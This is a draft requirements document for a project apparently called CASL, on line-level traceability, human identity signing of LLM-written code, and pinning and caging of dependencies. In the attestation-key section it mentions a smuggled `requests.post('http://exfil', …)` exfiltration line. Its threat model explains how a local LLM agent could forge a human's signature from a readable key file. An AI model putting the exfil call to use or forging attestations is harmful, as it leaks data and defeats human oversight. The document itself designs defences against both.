# Proposed Requirements — Artifacts, Dependencies, Traceability & Human Attestation

**Date:** 2026-06-23 · **Status:** **Draft for discussion (pre-CEP).** *(rev. e — 2026-06-24: the MECHANISMS of groups A–E are now IMPLEMENTED on branch `feat/artifact-trust` — project/manifest, artifact unit + provenance, dependency burden ledger, line-trace + blame, human-identity attestation, Tier-0 obligation gate — recorded in CEP-0057 (Informational Draft). The per-requirement promotion to `spec.REQS` / Standards CEPs remains a CODEOWNERS-gated maintainer sign-off, pending PR review.)* Nothing here is authority yet. These are *proposed* requirements to argue about; once agreed they become `proposals/cep-00NN-*.md` with matching `spec.REQS` entries (the audit's round-trip then enforces them; `CODEOWNERS` requires your sign-off on `spec.py`/`proposals/`).
*(rev. d — 2026-06-24: dependencies reframed as an **accepted, contained liability** (not verified, not line-traced); **project-wide** line traceability with **author + provenance + blame** for everything we own; **human-identity signing** (a human signs *as a human*; the plaintext `.env` seed is demoted to a content-binding demo). rev. c — foreign-artifact picture; rev. b — attestation-key model.)*
**Reference:** `spec.py` (authority, theses T1–T5, principles P0–P9), `levels.py` (assurance G0–G3), `docs/cockpit.md`, `docs/ide-traceability.md`.

---

## 0. The governing idea (the premise to agree on first)

Two honest premises, in your words:

> **Premise 1 — dependencies are a carried burden.** The moment a program imports a whole piece of software, you *trust* that software. We **cannot** verify each import. Installed packages are **liabilities we accept and carry** — governed at their interface and contained at runtime, but neither proven nor line-traced.
>
> **Premise 2 — our own code is fully accountable.** Everything *we* own — **every file in the project**, including code an LLM wrote and we committed — must be traceable: **every line back to a requirement, to the programmer accountable for it, and to how it was produced (human or LLM)**, so a bug **blames** the responsible person's lines. And a human attests **as a human** — by signing with an identity only that human controls.

These are *different* stances for *different* classes of code, and CASL's original principle (**P2 — correctness by construction**, "prove the hull, treat the LLM as a momentary oracle") covers **neither**: an imported library is durable code we can't prove **and don't own**; an LLM-written module is durable code we can't prove **but do own**. Proof is off the table for both (`W17`). The sound remaining stance is therefore not "trust", but **responsibility + containment**:

> **Proposed principle (P10 — accountability where proof is impossible).** Where proof is impossible (`W17`), safety never rests on a marker or on author free-text. It rests on two things: **(1) CONTAINMENT** — the code runs *caged* behind a capability, approval-gated for irreversible effects, monitored at the boundary; and **(2) ACCOUNTABILITY** — provenance, line-level traceability to a **requirement** and a **named human**, and a **human signature bound to exact content**. Proof of the *inside* is replaced by control of the *outside* plus a chain of responsibility.

The honest reframe vs. earlier drafts: P10 does **not** "earn trust" — it **assigns responsibility** and **contains execution**. A signature means *a human is accountable for exactly this content*, **not** *this content is correct*. The real safety for unprovable code is the **cage**; the signature is the **liability anchor**, and the trace is the **blame chain**.

### Two classes, two regimes

| | **first-party** (we own) | **dependency** (we use) |
|---|---|---|
| examples | our `.casl`, our `.py`/`.rs`, **LLM-written modules we committed** | pip/cargo packages, vendored libs |
| basis | **accountability**: full line-trace + author + provenance + human signature | **accepted liability**: trust *assumed* at the interface |
| traceability | **every line** → requirement + author + (`human`\|`llm`) | **not** line-traced; the *package* is **pinned + recorded as a burden** |
| containment | capability cage + approval + monitor | the *same* cage + approval + monitor |
| attestation | human signature (identity-backed), content-bound, decays on change | one human declaration **accepting the burden** + a pinned hash/lockfile |

How your sentence maps onto the groups:

| your words | group | requirements |
|---|---|---|
| "all files in the project … traced" | C. Traceability | LH-P-006, LH-P-007, LH-P-009 |
| "every line → requirement + programmer + how produced + blame" | C. Traceability | LH-P-006, LH-P-007 |
| "must be attested … humans sign as humans" | B. Attestation | LH-Q-016, LH-Q-017, LH-Q-018 |
| "imports are burdens you carry" | A/D. Dependency burden | LH-F-013, LH-Q-020 |
| "artifacts … described in CASL" | A. Artifact as a unit | LH-F-012, LH-F-013 |
| "we can enforce" | D. Enforcement | LH-G-006, LH-Q-019 |
| (so you can review what you sign) | E. Observability | LH-G-005 |

---

## 1. How CASL handles foreign code — the picture

*(Narrative; groups A–E below are its formal backing.)*

### 1.1 Two classes of foreign code

**Dependency (used).** Third-party software we import. We **accept that we trust it** — verifying each transitive import is neither feasible nor the goal. CASL governs it as a **declared, pinned, recorded burden**: a version/hash-pinned manifest (lockfile), an interface contract at the call site, and the **runtime cage**. We do **not** line-trace it and do **not** attest its body. What we *do* record is the *fact and owner of the trust decision* ("we depend on `requests==X`; accepted by Alice on date Y") so the burden is visible, not silent. (LH-Q-020)

**First-party (owned).** Every file in *our* project — hand-written or LLM-generated and then committed by us. Once it is in our tree, **we own it**: it is fully line-traced, every line carries an accountable human and a production mechanism, and effect-bearing parts carry a human signature. An LLM writing the file does **not** move it into the dependency/burden class — the human who commits it **owns and is accountable for it**.

> The dividing line is **ownership**, not who typed the characters. Imported = burden (trust assumed, contained). In our tree = owned (traced, blamed, signed).

### 1.2 Two boundaries CASL always checks

Both classes are fenced on the same two sides:

1. **The static seam (check time).** A *typed interface* — `(args) -> T | ()` + pre/post **contracts** (SMT). CASL checks the *seam* even when it cannot check the *body*. (LH-F-012)
2. **The runtime cage (run time).** The code runs **behind a capability** (least privilege); the **tool broker** denies anything undeclared (`LH-Q-014`); every irreversible effect is **approval-gated** (`LH-Q-011`); output is **monitored at the boundary** (contract / blame / refusal, cost metered out-of-band). A wrong or hostile body — ours or a dependency's — **cannot exceed its capability, cannot act without consent, and its output is checked at the edge.**

The proof we cannot have **inside** is replaced by **containment outside** + **accountability** (trace + blame + signature). That is the whole idea — and for dependencies, *containment is the only lever*, since accountability for their internals is not ours to give.

### 1.3 The lifecycle of a first-party artifact

```
 declare ─▶ produce ─▶ trace ─▶ observe ─▶ review ─▶ sign ─▶ GATE(adopt) ─▶ run(caged) ─▶ re-verify
 F-012/013  human OR    line→req  prompt→    human    human-  Tier-0:          dispatch     every check:
 kind,grade  llm        + author  response   reads     IDENTITY grade+trace+    behind cap   re-hash + verify
 trace-obl. (committed) + how     (G-005)    the diff  key      author+sign?    +broker      sig; change ⇒
            by a human  (P-006/7)            (review)  (Q-018)  else DENY(G-006) +approval    EXPIRE (Q-017)
```

A dependency's lifecycle is shorter and blunter: **declare ▶ pin (hash/lockfile) ▶ accept-burden (one human signature) ▶ run(caged)**. No line-trace, no per-line author, no body review — by design (Premise 1).

### 1.4 Concrete realization (what it is on disk)

```
.casl/attest.pub              <public key / key-id>               # committed, CODEOWNERS-protected
                              # the SECRET is an identity key the human controls (GPG/SSH/hardware) — NOT in the repo
src/handlers/smtp_send.py     def smtp_send(to, subject, body): … # first-party artifact (LLM-written, we own it)
attestations/smtp_send.json   { artifact, sha256, requirement, author, mechanism, ts, signer, sig }  # committed, CODEOWNERS
deps.lock                     requests==2.x  sha256:…  accepted-by:Alice  date:…   # the dependency burden ledger (Q-020)
```

- **Trace** = `git blame` → commit → requirement (`trace.py`) **plus** a per-line author + mechanism (`human`\|`llm`); an untraceable first-party line is flagged and **blocks** (LH-P-006/007).
- **Sign** = a signature **by a human identity** over `(artifact, sha256, requirement, author, ts)` — git-native `commit -S` (GPG/SSH), ideally a hardware/passphrase-protected key. The record is committed; forging it needs the human's private key.
- **Verify (every check)** = re-hash + check the signature against `.casl/attest.pub`. Matching hash **and** valid signature from a *recorded human identity* ⇒ *attested & unchanged*; **any** edit ⇒ `DENY — hash mismatch`.

### 1.5 What this does and does not buy

- **Does:** no artifact (ours or a dependency) can exceed its capability or cause an irreversible effect without consent; its output is monitored; **every first-party line answers "why does this exist, who is accountable, and was it written by a human or an LLM?"**; a change is *evident and consequential*; the end-to-end grade is **shown, not hidden** (LH-Q-019); and a dependency we trust is at least **named, pinned, and owned by a person who accepted it**.
- **Does not:** prove any internal logic — neither ours nor a dependency's (`W17`); make a dependency *safe* (we only contain it); make a human signature mean *correct* (it means *accountable*). Internal correctness rests on tests (G2) or a human's signed reading (G3) — which is precisely *why* the seam, the cage, the trace, the blame chain, and the signature exist.

---

## A. The artifact as a first-class described unit

### LH-F-012 — Artifact declaration *(MUST · verif T/B · T2,T4)*
**Statement.** CASL can describe an *artifact* (a used or written module/component) as a first-class unit with a **typed interface** — `(args) -> T | ()` plus optional pre/post contracts — distinct from a role.

**Justification.** Today CASL has only roles, messages, and a bare producer boolean (`oracle`/`verified`). There is no place to *name* the SMTP client or the crypto library, and so nowhere to attach an obligation. The interface (signature + contract) is the part CASL *can* check even when the body cannot be proven — the seam, and seams are what CASL governs. *Alternative considered:* encode artifacts as request/response role pairs — rejected; it conflates a local component with a distributed protocol.

### LH-F-013 — Artifact provenance/kind, and the ownership split *(MUST · verif T · T1,T4)*
**Statement.** Every artifact is classified by **how it came to be** *and* **whether we own it**: `external` (used, third-party — the **dependency/burden** class), `generated` (LLM-written, committed by us — **first-party**), `verified` (deterministic, in-hull — first-party), `oracle` (a live LLM call — first-party at the call site). The kind is structured and validated — **never inferred from a name or free-text** — and it determines the regime: `external` ⇒ burden (interface + pin + cage, LH-Q-020); everything else ⇒ owned (full trace + author + provenance + signature).

**Justification.** The obligation a thing carries depends on its origin *and ownership*. A vendored library and an LLM-written module we committed are governed **differently**: the first we contain and accept; the second we trace, blame, and sign — because we *own* it the moment it is in our tree (Premise 1/2). Structured provenance is the same lesson as `R-H1`/`W14` (trust never from a spoofable string). This requirement also **unifies** the producer trichotomy: `oracle`/`verified` become *kinds*, not ad-hoc booleans. *Tension:* an artifact can change kind (an LLM draft a human rewrites) — kind is re-evaluated on change, linking to attestation decay (LH-Q-017).

---

## B. The attestation obligation ("must be attested … as a human")

### LH-Q-016 — Mandatory assurance grade, deny-by-default *(MUST · verif T · T3,T4)*
**Statement.** Every artifact carries a **declared required assurance grade** (G0–G3). The gate refuses to use/adopt it below that grade. Anything not provable (`external`/`generated`/`oracle`) has a **floor of G3** — it cannot enter without a human act: for first-party code a **content-bound human signature**; for a dependency a **human burden-acceptance** (LH-Q-020).

**Justification.** The formal answer to "we can never prove it": proof being impossible (`W17`) does not license "trust it anyway" — it requires a *trust/responsibility act proportional to risk*, made *unavoidable and explicit* by deny-by-default. Silence is denial, not consent. *Alternative considered:* trust a `verified` marker on faith — rejected (the exact escalation P10/R-H1 forbid).

### LH-Q-017 — Attestation is content-bound and decays *(MUST · verif T/M · T5,T3)*
**Statement.** An attestation is bound to the artifact's **exact content** (a fingerprint) — realised as a **signature** over that fingerprint (LH-Q-018) — and to the **requirement** it was given for. On content change the attestation **expires** and the artifact drops to its unprovable floor (re-review). For a dependency, the fingerprint is the **pinned package hash** (LH-Q-020); a version bump expires the burden-acceptance.

**Justification.** A stale attestation is *worse* than none — it looks like assurance over code that no longer exists. Binding to a fingerprint makes "I reviewed this" mean "I reviewed *exactly this*"; pinning makes "we accepted this dependency" mean "*exactly this version*." Same discipline as the trace layer's stale-anchor rule. *Tension:* aggressive expiry → review fatigue; semantic-vs-textual decay is open (§Open-2).

### LH-Q-018 — Attestation is human, non-self, and identity-bound *(MUST · verif T · T3)*
**Statement.** An attestation is a **human Tier-3 act, signed with an identity only a human controls** (a **human signs *as a human***). The entity that *produced* an artifact may **not** attest it (producer ≠ attester); an LLM may *pre-screen* (flag, summarise, recommend, **veto**) but **never sign**. The signing key MUST be one a local automated agent **cannot read and reuse** — i.e. a hardware-/passphrase-protected or OS-keychain identity (git `commit -S` with GPG/SSH), **not** a plaintext secret sitting in the working tree.

**Justification.** "Agents may veto, never vouch" applied to artifacts. Self-attestation — the generator certifying its own output — is the most direct laundering path from "unproven" to "trusted", and exactly what an over-confident or adversarial model would do. **Crucially, the *mechanism* must enforce the *human*, not just policy:** if the signing secret is a file the coding agent can read (e.g. a plaintext `.env` seed), then a local agent can forge the human's signature and the invariant is hollow. Requiring an identity key the agent cannot exfiltrate is what makes "humans sign as humans" *true*, not aspirational. *Tension:* this can bottleneck on the human — mitigated by batching, LLM pre-screening (allowed), and grading (only effect-bearing/high-risk artifacts require a signature; LH-Q-016 floors).

### Attestation key — the signing mechanism *(rev. d: human-identity-first)*
**Decision.** Attestation = a **signature by a human-controlled identity** over `(content-hash, requirement-id, author, timestamp, artifact-id)`. Verifying = re-hash the anchor-resolved artifact (LH-Q-017) + check the signature against the project's **recorded public key/identity** (`.casl/attest.pub`, CODEOWNERS-protected). This is the concrete content of the reserved **σ** field (`spec.py` W8: provenance/signature).

**Baseline (real use): git-native identity signing.** `git commit -S` with **GPG or SSH** keys — ideally **hardware-backed (FIDO2/PIV/Secure Enclave) or passphrase-protected**. The private key never sits in the repo *or* in a file a local agent can read, so a coding agent on the same machine **cannot forge** the human act. This is what satisfies LH-Q-018 in the presence of in-tree LLM agents.

**Demo only — NOT sufficient: a plaintext key in `.env`.** An Ed25519 seed in `.env` demonstrates **content-binding** (edit ⇒ hash mismatch ⇒ deny — shown end-to-end 2026-06-24, a smuggled `requests.post('http://exfil', …)` line was rejected). But it does **not** satisfy LH-Q-018: any process that can read the file — *including the LLM agent we are trying to hold accountable* — can sign as the human. The `.env` seed is therefore a **throwaway demonstration of the hash mechanism**, explicitly **not** an attestation root for real use.

**Honest limits.** Even a hardware identity is a single-holder root unless paired with rotation and recovery; old public keys must be **retained** so past signatures stay verifiable. Keyless (Sigstore-style) and per-maintainer vs per-project keys are open (§Open-7).

---

## C. The traceability obligation ("all files traced; every line → requirement + programmer + how + blame")

### LH-P-006 — Project-wide line-level traceability *(MUST · verif T · T5)*
**Statement.** For **every first-party file in the project**, every line maps to a requirement via its commit (`git blame` → commit → `LH-*`). Untraced first-party lines are flagged and **block adoption**. (Dependencies are exempt — they are a burden, LH-Q-020, not first-party.) Detailed in `docs/ide-traceability.md`.

**Justification.** The concrete content of "all files in the project must be traced." Language-agnostic (works on Python or Rust), it is the *project-wide, line-level* sharpening of `LH-P-005`. Teeth: deny-by-default — a first-party line with no requirement is not adopted. *Why sound where proof is not:* it does not claim the line is *correct*; it claims the line is **accountable** — you can always answer "why does this line exist?" with a requirement. *Honest limit:* the line→commit→requirement link rests on the commit convention; it proves **provenance/accountability**, not that the line *correctly realises* the requirement (that is what review + signature + tests are for). It must not be sold as "justification".

### LH-P-007 — Per-line authorship, production mechanism, and blame *(MUST · verif T · T5,T3)*
**Statement.** Every first-party line additionally records **who is accountable** (a named human author) and **how it was produced** (`human` = hand-written, `llm` = model-generated and committed by that human). A bug therefore **blames** a concrete human's lines, and the cockpit can show, per line/region, "author X, produced by `llm`/`human`, realises `LH-*`." Committing LLM-generated code makes the **committer the accountable author** — there is no "the model wrote it" excuse.

**Justification.** Your exact requirement: every line back to a programmer and to whether a human or an LLM produced it, so bugs blame the responsible person. This closes the accountability gap that `LH-P-006` alone leaves (blame attaches to a *human*, and "human vs LLM" is explicit and queryable, not guessed). It also makes the human-vs-LLM mix of the codebase **measurable** — which feeds the completeness/assurance picture (more `llm` lines under one human signature = more concentrated risk). *Design:* `git blame` already yields author+commit; the `human`/`llm` mechanism is an explicit, validated per-region annotation (not inferred), in the spirit of `R-H1` (structured field, not free-text). *Tension:* granularity — per line vs per region/function (§Open-1); fine-grained is precise but heavy.

### LH-P-009 — Traceability regime follows ownership, not free choice *(MUST · verif T · T5)*
**Statement.** The traceability regime is **determined by provenance (LH-F-013), not chosen ad hoc**: first-party (`generated`/`verified`/`oracle`) ⇒ **`full`** (LH-P-006 + LH-P-007 apply, mandatory); dependency (`external`) ⇒ **`burden`** (LH-Q-020: pinned + recorded + caged, **not** line-traced). An **effect-bearing** first-party artifact may **never** be demoted below `full`.

**Justification.** This replaces the earlier free `full`/`interface` choice, which was a **self-downgrade escape hatch** (under deadline, mark the risky module `interface` and skip the trace). Tying the regime to *ownership* removes that hatch: if we own it, it is fully traced; the only `interface`/burden things are dependencies we *don't* own. *Tension:* a genuinely opaque-but-owned blob (e.g. generated parser tables) — handled by region-level trace to a single "generated-by `LH-*`" requirement, still owned and signed, never silently exempt.

### LH-P-008 — Auditable artifact + dependency units *(SHOULD · verif T · T5,T4)*
**Statement.** Every adopted first-party artifact **and** every accepted dependency records, in one place: the **requirement(s)** it realises/serves, its **provenance** (LH-F-013), its **grade + attestation** (group B), its **traceability regime** (LH-P-009), and — for dependencies — its **pin + accepting human** (LH-Q-020). (The ledger from `docs/cockpit.md`.)

**Justification.** Obligations are worthless unless *materialised and queryable*. This is the ledger row the audit checks and the cockpit renders: for any unit, "what does it realise, who made it, who signed it / who accepted the burden, is it traced?"; for any requirement, "which units carry it, at what grade?". The join that makes the scheme inspectable (P0/P9) — and the one place the **dependency burden** is made visible rather than buried in a lockfile.

---

## D. Enforcement ("we can enforce")

### LH-G-006 — Obligation as a Tier-0 precondition *(MUST · verif T/B · T2,T3)*
**Statement.** A unit may be **used or adopted only if all its declared obligations are satisfied** — grade met; for first-party: attestation present, fresh, human-signed, and full-traced (LH-P-006/007); for dependencies: pinned + burden accepted (LH-Q-020). Otherwise the deterministic gate **rejects**. Deny-by-default.

**Justification.** Turns "should be attested/traced" into "*cannot proceed* without it." The most important requirement here: merely-recommended obligations get skipped under deadline. At **Tier 0** (the only opener), no agent and no shortcut can release a unit with unmet obligations — "agents may veto, never vouch." *Alternative considered:* enforce via generator prompts — rejected; prompts are soft, the gate is hard. *Tension noted (Open-6):* deny-by-default-must-sign also *manufactures* pressure to rubber-stamp; the countermeasure is observability (group E) + grading (only high-risk needs a signature), and it must be designed against, not ignored.

### LH-Q-019 — Obligation monotonicity under composition *(SHOULD · verif B/T · T2,T4)*
**Statement.** Composition can only **weaken** trust: a pipeline/protocol's effective grade is the **minimum** over its constituents (artifacts **and** dependencies); a low-grade unit taints every consumer of its output. Wrapping a G3 unit cannot manufacture a G0 result.

**Justification.** Trust composes downward; the dangerous failure is **laundering** — hiding an unproven module (or dependency) behind a "verified" façade. Min-grade makes laundering impossible by construction, generalising `pipeline_safe` (`LH-F-011`, `W17`). *Open tension (Open-4), now sharpened to a likely MUST:* a **global** minimum collapses the signal — any real system with one LLM call / one dependency is "G3 end-to-end", so the headline number stops discriminating. **Grade-per-data-flow-path** (a contained, monitored G3 call need not drag a whole system down) is probably *necessary*, not optional, for the grade to mean anything.

### LH-Q-020 — Dependency burden: declared, pinned, owned, contained *(MUST · verif T/B · T4,T3)*
**Statement.** Every `external` dependency is **declared, version/hash-pinned** (a lockfile), **recorded with the human who accepted the burden** (LH-P-008), and **contained** at runtime (capability cage). Its trust is **explicitly assumed, not verified** — CASL makes the assumption *visible and owned*, it does not pretend to check the body. An **unpinned or undeclared** import **blocks** (deny-by-default); a **version/hash change** expires the burden-acceptance (LH-Q-017) and requires re-acceptance.

**Justification.** Your Premise 1 made enforceable: we cannot verify imports, so we do the next sound thing — **bound and own the liability**. Pinning turns "we trust some `requests`" into "we trust *exactly this* `requests`, hash X" (and detects substitution/supply-chain tampering); recording the accepting human turns an invisible transitive trust into an **owned decision**; the cage ensures even a hostile dependency cannot exceed its capability. This is deliberately *not* line-trace or body-attestation — those would be dishonest for code we did not write. *Open (Open-3, now mostly settled):* whether to additionally require SBOM/provenance attestations (Sigstore, SLSA) for the supply chain, or stop at pin + cage.

---

## E. Observability (so you can review what you sign)

### LH-G-005 — Observable production *(MUST · verif T · T3,T5)*
**Statement.** When a first-party artifact is LLM-produced, the producing call (**prompt → response**, verbatim) is captured and linked to the artifact + requirement + author. (Detailed in `docs/cockpit.md`.)

**Justification.** Attestation (group B) is only meaningful if the human can *cheaply see what they are signing*. The exact prompt + output, next to the requirement and the diff, makes a G3 signature an *informed* act, not a rubber stamp — the direct countermeasure to automation bias (and to the Open-6 rubber-stamp pressure). It closes the loop: we cannot prove the artifact, so we (1) trace it to a requirement and a human, (2) require that human to sign as a human, and (3) show them exactly what was asked and produced.

---

## 2. How they compose (one sentence)

A unit is **declared** (LH-F-012) with a **provenance/ownership** (LH-F-013); if we **own** it, every line is traced to a requirement, an author, and a human/LLM mechanism (LH-P-006/007), it meets a **grade** (LH-Q-016) whose attestation is **content-bound** (LH-Q-017) and **human, non-self, identity-signed** (LH-Q-018); if it is a **dependency**, it is pinned + owned-as-a-burden + caged (LH-Q-020); all is **recorded** (LH-P-008) and **observable** (LH-G-005); the gate **enforces** this at Tier 0 (LH-G-006) and trust **only weakens** under composition (LH-Q-019).

## 3. Worked micro-example (the email secretary)

| unit | kind | owned? | grade | trace regime | attestation |
|---|---|---|---|---|---|
| `smtp_send` (LLM-written, committed) | `generated` | **yes (first-party)** | **G3** | **full** (line→req+author+`llm`) | **human signature** (identity-bound), content-bound |
| `summarise` (LLM call) | `oracle` | yes (call site) | G3 (monitored) | full at the seam | per-call, observable |
| `budget_check` (decidable) | `verified` | yes | G1/G0 | full | proved → no human signature needed |
| `requests` (pip package) | `external` | **no (dependency)** | G2 at best, **contained** | **burden** (pinned, **not** line-traced) | **one human burden-acceptance** + pinned hash |

Reading: we can never *prove* `smtp_send`, and because **we committed it we own it** — so it is G3 + full line-trace (every line → requirement + the human who committed it + `llm`) + that human's identity signature, and the cockpit shows the prompt that produced it and the diff being signed. `requests` we **do not own**: we cannot verify it, so we **pin it, record who accepted the burden, and cage it** — no line-trace, no body signature, by design. `budget_check`, being decidable, needs no signature — proof discharges the obligation. End-to-end grade is **G3** (weakest owned link) or lower if a dependency is less; LH-Q-019 makes that visible (and Open-4 asks whether it should be per-path so one caged G3 call doesn't flatten the whole picture).

## 4. Open questions (for the discussion)

1. **Granularity (LH-P-007).** Author/mechanism per *line*, per *region*, or per *function*? Finer = precise blame, more bookkeeping.
2. **Decay policy (LH-Q-017).** Does *any* textual change expire an attestation, or only a *semantic* one (and who decides "semantic")?
3. **Supply chain beyond pin (LH-Q-020).** Is pin + cage + owned-burden enough, or do we additionally want SBOM / SLSA / Sigstore provenance for dependencies? *(Largely settled: deps are a burden, not line-traced; the only question is how strong the pin/provenance is.)*
4. **Monotonicity strictness (LH-Q-019).** Global minimum grade, or **grade-per-data-flow-path**? Leaning *per-path* — a global minimum collapses to "always G3" and the number stops meaning anything.
5. **P10 as a principle.** Elevate "accountability where proof is impossible" to a numbered first principle (P10), or keep it as a corollary of P0/P2/P8/P9?
6. **Rubber-stamp pressure (LH-G-006).** Deny-by-default forces a trust act *and* manufactures pressure to sign blindly under deadline. Beyond observability (E) and grading, do we need e.g. a cool-down, a second signer for the highest risk, or sampled re-review?
7. **Attestation-key lifecycle (LH-Q-018).** Identity-key baseline (GPG/SSH, hardware) chosen; still open: rotation, loss/recovery, retaining old public keys so past signatures verify, and one key per project vs per maintainer.
8. **Module vs artifact (LH-F-012).** Is the artifact unit the same as the callable `module` from the last discussion? (Current view: same unit, two faces — `module` is the in-protocol caller, `artifact` the governed body.)

## 5. Proposed mapping (→ CEP)

| req | level | verif | theses | realises-by (proposed block) | becomes |
|---|---|---|---|---|---|
| LH-F-012 | MUST | T/B | T2,T4 | `artifact_decl` | cep-0057 |
| LH-F-013 | MUST | T | T1,T4 | `artifact_kind` | cep-0058 |
| LH-Q-016 | MUST | T | T3,T4 | `assurance_floor` | cep-0059 |
| LH-Q-017 | MUST | T/M | T5,T3 | `attestation_binding` | cep-0060 |
| LH-Q-018 | MUST | T | T3 | `attestation_human_identity` | cep-0061 |
| LH-P-006 | MUST | T | T5 | `line_traceability` | cep-0062a (+ ide-traceability.md) |
| LH-P-007 | MUST | T | T5,T3 | `line_authorship_blame` | cep-0062b |
| LH-P-009 | MUST | T | T5 | `trace_regime_by_ownership` | cep-0063 |
| LH-G-006 | MUST | T/B | T2,T3 | `obligation_gate` | cep-0064 |
| LH-Q-019 | SHOULD | B/T | T2,T4 | `obligation_monotone` | cep-0065 |
| LH-Q-020 | MUST | T/B | T4,T3 | `dependency_burden` | cep-0066 |
| LH-P-008 | SHOULD | T | T5,T4 | `artifact_units` | (cockpit.md) |
| LH-G-005 | MUST | T | T3,T5 | `orchestration_record` | (cockpit.md) |

**Nothing above is enacted.** It is a slate to argue with — strike, merge, re-level, or re-scope freely; the ones you keep get written up as CEPs with their building blocks, and the audit makes them real.
